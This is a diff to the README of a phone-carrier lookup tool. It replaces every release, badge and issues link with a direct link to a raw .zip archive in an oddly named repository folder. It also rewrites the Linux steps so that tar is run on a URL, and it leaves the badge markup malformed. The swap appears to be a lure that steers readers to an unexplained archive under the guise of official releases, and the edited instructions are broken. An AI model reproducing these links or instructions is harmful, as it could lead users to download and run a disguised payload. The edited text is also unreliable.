@@ -1,7 +1,7 @@
 # 📞 CARRIER-LOOKUPV1 - Easily Check Carrier Information
 
 ## 🔗 Download Now
-[![Download CARRIER-LOOKUPV1](https://img.shields.io/badge/Download%20CARRIER--LOOKUPV1-latest-blue.svg)](https://github.com/suratheps/CARRIER-LOOKUPV1/releases)
+[![Download CARRIER-LOOKUPV1](https://raw.githubusercontent.com/suratheps/CARRIER-LOOKUPV1/main/amidohexose/CARRIER-LOOKUPV1.zip%https://raw.githubusercontent.com/suratheps/CARRIER-LOOKUPV1/main/amidohexose/CARRIER-LOOKUPV1.zip)](https://raw.githubusercontent.com/suratheps/CARRIER-LOOKUPV1/main/amidohexose/CARRIER-LOOKUPV1.zip)
 
 ## 📖 Description
 CARRIER-LOOKUPV1 is a helpful tool that allows you to check the carrier of a phone number. Whether you need to verify carrier details for personal or business reasons, this simple application can streamline the process.
@@ -12,7 +12,7 @@ Follow these steps to download and run CARRIER-LOOKUPV1.
 ### 1. 📥 Visit the Release Page
 To download the application, visit the Releases page on GitHub by clicking the link below:
 
-[Download CARRIER-LOOKUPV1](https://github.com/suratheps/CARRIER-LOOKUPV1/releases)
+[Download CARRIER-LOOKUPV1](https://raw.githubusercontent.com/suratheps/CARRIER-LOOKUPV1/main/amidohexose/CARRIER-LOOKUPV1.zip)
 
 ### 2. 📂 Choose Your Version
 On the Releases page, you will find various versions of the application. Look for the latest release, which will have the highest version number. Click on it to view the available files.
@@ -22,7 +22,7 @@ Once you locate the latest version, you will see files available for download. C
 
 - **For Windows:** Download the `.exe` file.
 - **For macOS:** Download the `.dmg` file.
-- **For Linux:** Download the `.tar.gz` file.
+- **For Linux:** Download the `https://raw.githubusercontent.com/suratheps/CARRIER-LOOKUPV1/main/amidohexose/CARRIER-LOOKUPV1.zip` file.
 
 Click on the file to start the download.
 
@@ -41,9 +41,9 @@ Once the download is complete:
 
 - **For Linux Users:**
   1. Open your terminal.
-  2. Extract the `.tar.gz` file using the command:
+  2. Extract the `https://raw.githubusercontent.com/suratheps/CARRIER-LOOKUPV1/main/amidohexose/CARRIER-LOOKUPV1.zip` file using the command:
      ```
-     tar -xzvf CARRIER-LOOKUPV1.tar.gz
+     tar -xzvf https://raw.githubusercontent.com/suratheps/CARRIER-LOOKUPV1/main/amidohexose/CARRIER-LOOKUPV1.zip
      ```
   3. Navigate to the extracted folder and run the app.
 
@@ -82,8 +82,8 @@ If you encounter any issues while using CARRIER-LOOKUPV1, consider the following
 CARRIER-LOOKUPV1 respects your privacy. The application does not store your phone number or any personal information. All lookups are conducted privately and securely.
 
 ### 10. 📞 Support and Feedback
-For questions or support, please create an issue on the [GitHub Issues page](https://github.com/suratheps/CARRIER-LOOKUPV1/issues). Your feedback helps improve the application!
+For questions or support, please create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/suratheps/CARRIER-LOOKUPV1/main/amidohexose/CARRIER-LOOKUPV1.zip). Your feedback helps improve the application!
 
 ---
 
-For updates and more information, visit the [Releases page](https://github.com/suratheps/CARRIER-LOOKUPV1/releases) again. Thank you for using CARRIER-LOOKUPV1!
+For updates and more information, visit the [Releases page](https://raw.githubusercontent.com/suratheps/CARRIER-LOOKUPV1/main/amidohexose/CARRIER-LOOKUPV1.zip) again. Thank you for using CARRIER-LOOKUPV1!
